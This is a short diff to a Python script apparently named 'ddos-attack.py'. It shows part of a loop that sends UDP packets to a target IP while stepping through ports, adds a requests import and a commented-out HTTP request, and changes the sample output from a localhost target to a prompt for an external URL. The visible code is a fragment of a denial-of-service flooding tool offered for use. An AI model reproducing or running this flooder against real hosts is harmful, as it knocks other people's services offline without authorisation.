@@ -1,5 +1,5 @@
 
-import time
+import requests
 import socket
 import random
 from datetime import datetime
@@ -30,6 +30,7 @@ sent = 0
 port = 5000
 
 while True:
+  # requests.get(site)
   sock.sendto(bytes, (ip,port))
   sent = sent + 1
   port = port + 1
@@ -41,6 +42,7 @@ while True:
 # Output:
 
 '''
-IP Target : 127.0.0.1
-Port : 5000
+python ddos-attack.py
+
+Enter IP/URL Target : https://************.***/
 '''
